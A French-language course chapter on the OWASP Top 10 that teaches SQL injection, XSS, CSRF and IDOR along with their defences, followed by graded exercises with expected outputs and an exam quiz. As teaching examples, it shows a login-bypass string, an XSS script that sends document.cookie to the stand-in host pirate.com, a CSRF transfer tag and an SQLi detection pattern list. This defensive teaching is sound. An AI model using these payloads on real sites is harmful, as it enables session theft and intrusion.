Chapitre 4 — Vulnérabilités Applicatives & Top 10 OWASP

Module 4 ≈ 2 h 45 de travail Réservé B2 et plus
Mise en situation

Lors d’un test d’intrusion (pentest) sur une plateforme de commerce électronique, l’auditeur saisit admin' OR '1'='1 dans le formulaire de connexion et accède instantanément au tableau de bord administrateur sans mot de passe. Plus loin, il poste un commentaire contenant <script>fetch("http://pirate.com/?c=" + document.cookie)</script> qui vole la session de tous les clients consultant la fiche produit. Pourquoi ces failles applicatives continuent-elles de figurer en tête du classement OWASP depuis vingt ans ? Comment éradiquer définitivement les injections et neutraliser les failles XSS à la source ? Ce module détaille l’anatomie des vulnérabilités web et leurs parades logicielles.

Objectifs pédagogiques

À la fin de ce chapitre, vous serez capable de :

  1. maîtriser le classement mondial du Top 10 de l’OWASP et ses catégories maîtresses (A01 à A03) ;
  2. analyser le mécanisme d’une injection SQL et déployer des requêtes préparées avec liaison de paramètres (Prepared Statements) ;
  3. différencier les trois variantes de Cross-Site Scripting (XSS stockée, réfléchie et basée sur le DOM) ;
  4. mettre en œuvre l’assainissement (sanitization), l’échappement contextuel et les drapeaux de cookies sécurisés (HttpOnly, SameSite) ;
  5. détecter et corriger les failles de contrôle d’accès au niveau de l’objet (IDOR / Broken Access Control).

1. Le Top 10 de l’OWASP : La référence mondiale de la sécurité logicielle

L’OWASP (Open Web Application Security Project) publie périodiquement le consensus mondial des dix risques les plus critiques pour les applications web. L’édition actuelle met en lumière les priorités suivantes :

Rang OWASPIntitulé officielDescription & Impact métier
A01:2021Contrôle d’accès défaillant (Broken Access Control)Un utilisateur régulier accède aux données d’autrui (failles IDOR, élévation de privilèges horizontale/verticale).
A02:2021Défaillances cryptographiques (Cryptographic Failures)Transmission en HTTP clair, stockage de mots de passe non salés, usage d’algorithmes obsolètes (MD5, DES).
A03:2021Injection (Injections SQL, NoSQL, OS Command)Des données fournies par l’utilisateur sont interprétées comme du code par l’interpréteur ou le moteur SQL.
A04:2021Conception non sécurisée (Insecure Design)Absence de modélisation des menaces et d’architecture de sécurité dès la phase de spécification.
A05:2021Mauvaise configuration de sécurité (Security Misconfiguration)Mots de passe par défaut conservés, messages d’erreur bavards révélant les stack traces, ports inutiles ouverts.

2. Injections SQL (SQLi) : Mécanisme & Requêtes préparées

L’injection SQL se produit lorsque des entrées utilisateur sont concaténées dynamiquement dans une chaîne SQL sans aucune neutralisation préalable :

// CODE TRÈS VULNÉRABLE (Concaténation directe) :
query = "SELECT * FROM users WHERE username = '" + user_input + "' AND password = '" + pass_input + "'";

// Si user_input vaut : admin' OR '1'='1
// La requête exécutée par la base devient :
SELECT * FROM users WHERE username = 'admin' OR '1'='1' AND password = '...';
// La condition '1'='1 étant toujours vraie, la base renvoie le compte admin !
La seule contre-mesure absolue : Les requêtes préparées (Prepared Statements)

Le filtrage manuel par liste noire (retirer les guillemets ou le mot UNION) est régulièrement contourné par les pirates. La parade absolue consiste à utiliser des requêtes préparées avec paramètres typés :

# CODE ROBUSTE ET SÉCURISÉ (Paramètres séparés de l’analyse syntaxique) :
cursor.execute("SELECT * FROM users WHERE username = %s AND password = %s", (user_input, pass_input))

Le moteur SQL compile d’abord l’arbre syntaxique de la requête, puis injecte les paramètres comme de simples littéraux texte. Même si le paramètre contient ' OR 1=1 --, il sera recherché textuellement sans altérer la grammaire SQL.

3. Cross-Site Scripting (XSS) : Typologie & Défense en profondeur

Le XSS consiste à injecter des scripts JavaScript malveillants dans les pages web légitimes consultées par d’autres utilisateurs :

1. XSS Stockée (Stored XSS)

Le script malveillant est enregistré en base de données (ex. forum, commentaire) et exécuté chez chaque visiteur.

Gravité : Maximale.

2. XSS Réfléchie (Reflected XSS)

La charge utile est transmise dans un paramètre d’URL et réinjectée immédiatement dans la réponse (ex. résultat de recherche).

Vecteur : Liens piégés par phishing.

3. XSS basée sur le DOM (DOM XSS)

La faille réside entièrement côté client : du JavaScript local lit une source non sécurisée (location.hash) et l’écrit dans un puits dangereux (element.innerHTML).

Le bouclier à trois niveaux contre le XSS
  1. Échappement contextuel (Contextual Escaping) : Remplacer les entités HTML (& → &amp;, < → &lt;, > → &gt;, " → &quot;, ' → &#x27;).
  2. Drapeaux de cookies sécurisés : Définir HttpOnly sur le cookie de session (le script pirate ne peut plus lire document.cookie) et Secure (transit HTTPS uniquement).
  3. Politique de sécurité de contenu (CSP) : En-tête HTTP Content-Security-Policy: default-src 'self'; interdisant les scripts inline et domaines non autorisés.

4. CSRF (Cross-Site Request Forgery) & Failles IDOR

Deux autres failles majeures du contrôle applicatif méritent une attention rigoureuse :

Attaque CSRF (Recherche de faux ordres)

Un site piégé pousse le navigateur de la victime authentifiée à soumettre une requête à son insu vers la banque (le navigateur joignant automatiquement les cookies de session) :

<img src="https://banque.fr/virement?montant=1000&dest=pirate" />

Contre-mesures : Jeton synchronisé anti-CSRF (token aléatoire non prédictible) et attribut de cookie SameSite=Lax ou Strict.

Faille IDOR (Broken Object Access)

L’application utilise un identifiant direct sans vérifier les droits du porteur de la session :

GET /api/facture?id=1042

Un utilisateur remplace 1042 par 1043 et consulte les données d’une autre société.

Contre-mesure : Contrôle d’habilitation métier strict au niveau de la requête SQL ou du service de domaine.

Exercice 1 — Détecteur de motifs d’injection SQL (SQLi)

Étude de cas Niveau 1 — Acquisition

Objectif : Détecteur de motifs d’injection SQL (SQLi)

L’injection SQL permet à un attaquant de modifier la structure d’une requête exécutée par la base de données. Votre programme analyse une chaîne de saisie utilisateur à la recherche de signatures SQLi classiques (insensible à la casse) : - ' or - ' and - union select - -- - /* - sleep( - '=' Résultat d’analyse attendu : - Si un motif est trouvé : INJECTION SQL DETECTEE (motif: <motif>) (afficher le premier motif trouvé dans l’ordre de la liste ci-dessus). - Sinon : ENTREE VALIDEE.

Cas d’exemple
admin' OR '1'='1
Résolution attendue
INJECTION SQL DETECTEE (motif: ' or )

Exemple de référence.

Deux indices, rédigés en mots
  1. Identifiez les caractères syntaxiques d’échappement SQL (guillemets, double tiret de commentaire, clauses OR 1=1).
  2. La parade absolue contre l’injection SQL est l’utilisation exclusive de requêtes préparées paramétrées.

Exercice 2 — Neutralisateur de charge utile XSS (HTML Sanitizer)

Étude de cas Niveau 2 — Application

Objectif : Neutralisateur de charge utile XSS (HTML Sanitizer)

Les failles Cross-Site Scripting (XSS) surviennent lorsqu’une application web réinjecte des données utilisateur non filtrées dans le code HTML servi au navigateur. Pour neutraliser l’exécution de scripts, les cinq caractères critiques doivent être échappés en entités HTML dans l’ordre rigoureux suivant : 1. & → &amp; 2. < → &lt; 3. > → &gt; 4. " → &quot; 5. ' → &#x27; Entrée : Une chaîne de caractères contenant potentiellement des balises ou du JavaScript. Résultat d’analyse attendu : La chaîne neutralisée.

Cas d’exemple
<script>alert("XSS & Pwned");</script>
Résolution attendue
&lt;script&gt;alert(&quot;XSS &amp; Pwned&quot;);&lt;/script&gt;

Exemple de référence.

Deux indices, rédigés en mots
  1. La faille XSS injecte des balises de script ou des attributs d’événements dynamiques dans le code HTML affiché.
  2. L’assainissement convertit les chevrons et caractères réservés en entités HTML inoffensives.

Exercice 3 — Contrôleur d’accès contre les failles IDOR (Broken Object Level Auth)

Étude de cas Niveau 3 — Raisonnement

Objectif : Contrôleur d’accès contre les failles IDOR (Broken Object Level Auth)

Une faille IDOR (Insecure Direct Object Reference) permet à un utilisateur d’accéder aux ressources privées d’autrui simplement en modifiant un identifiant dans l’URL ou la requête. Entrée : user_id;user_role;requested_doc_id;owner_doc_id Règles d’autorisation : 1. Si user_role == "admin" : l’accès est accordé avec le motif ACCES AUTORISE (admin override). 2. Sinon, si user_id == owner_doc_id : l’utilisateur est le propriétaire légitime, accès accordé : ACCES AUTORISE (proprietaire). 3. Sinon : refus d’accès et alerte sécurité : ALERTE IDOR: utilisateur <user_id> non autorise sur document <requested_doc_id> de <owner_doc_id>.

Cas d’exemple
u101;client;doc42;doc42_owner_u101
Résolution attendue
ALERTE IDOR: utilisateur u101 non autorise sur document doc42 de doc42_owner_u101

Exemple de référence.

Deux indices, rédigés en mots
  1. La vulnérabilité IDOR survient lorsqu’un contrôle d’autorisation omet de vérifier le propriétaire légitime de l’objet.
  2. Validez que le jeton de session de l’utilisateur correspond formellement au compte propriétaire de la ressource.

6. QCM — niveau examen

Pourquoi l’utilisation de requêtes préparées (Prepared Statements) élimine-t-elle définitivement le risque d’injection SQL ?

En séparant la grammaire SQL des données littérales, le moteur de base de données ne réévalue jamais le contenu des paramètres comme une instruction exécutable, ce qui rend l’injection impossible.

Quel attribut de cookie HTTP empêche formellement un script malveillant injecté par XSS de dérober le cookie de session via document.cookie ?

L’attribut HttpOnly indique au navigateur que le cookie ne doit jamais être accessible via les APIs JavaScript du DOM (document.cookie), neutralisant ainsi le vol de session direct par XSS.

Quelle variante d’attaque XSS consiste à enregistrer définitivement la charge utile malveillante dans la base de données du site visé ?

La XSS stockée (ou persistante) sauvegarde le script dans la base de données (ex. profil, commentaire) qui s’exécute ensuite automatiquement chez tous les utilisateurs qui consultent cette ressource.

Comment caractérise-t-on une vulnérabilité IDOR (Insecure Direct Object Reference) ?

L’IDOR survient lorsque l’application expose une référence directe à un objet interne (clé primaire en base) et omet de valider si l’identité authentifiée a le droit légitime de lire ou modifier cet objet.

7. Erreurs classiques — récapitulatif

À reconnaître en examen
  • Tenter de contrer les injections SQL en concevant des filtres de nettoyage artisanaux basés sur des listes noires de mots clés.
  • Négliger l’échappement des données en sortie sous prétexte qu’elles proviennent de la propre base de données interne du site.
  • Oublier l’attribut HttpOnly sur les cookies contenant des jetons de session JWT ou d’authentification.
  • Croire que la méthode HTTP POST protège naturellement contre les attaques CSRF (un formulaire invisible auto-soumis contourne POST facilement).
  • Faire confiance à un identifiant transmis par le client dans un corps JSON sans vérifier l’appartenance de la ressource dans la session serveur.

8. Méthodologie de résolution

Protocole en 4 étapes pour sécuriser les formulaires et APIs contre le Top 10 OWASP
  1. Systématiser les requêtes préparées avec liaisons de paramètres typés pour chaque accès à la base de données relationnelle ou NoSQL.
  2. Échapper contextuellement chaque variable réinjectée dans le DOM HTML selon son emplacement (HTML body, attribut, script, style).
  3. Durcir les cookies de session : forcer systématiquement les drapeaux HttpOnly, Secure et SameSite=Lax (ou Strict).
  4. Intégrer un contrôle d’accès systématique par politique (ex. CanAccess(user, document_id)) avant toute opération de lecture ou d’écriture.

9. Révision active

Résumé essentiel
  • Le Top 10 OWASP classe les failles applicatives majeures, dominé par Broken Access Control et les Injections.
  • Les requêtes préparées neutralisent les injections SQL en dissociant la compilation de la requête des données entrantes.
  • Les failles XSS (stockée, réfléchie, DOM) se contrent par l’échappement HTML, la directive CSP et l’attribut de cookie HttpOnly.
  • Le CSRF usurpe l’action de l’utilisateur authentifié et se bloque avec des jetons anti-CSRF et SameSite.
  • Les failles IDOR exigent un contrôle rigoureux de l’appartenance de l’objet demandé à l’utilisateur de la session courante.

Checklist de maîtrise

  • Je sais identifier une concaténation SQL vulnérable et la réécrire avec des requêtes préparées.
  • Je connais la liste exacte des 5 caractères spéciaux HTML à échapper impérativement contre le XSS (&, <, >, ", ').
  • Je comprends le rôle des drapeaux HttpOnly, Secure et SameSite sur les cookies.
  • Je sais expliquer le fonctionnement d’une attaque CSRF et le rôle du jeton de synchronisation.
  • Je sais concevoir une vérification de droits pour interdire les accès non autorisés de type IDOR.
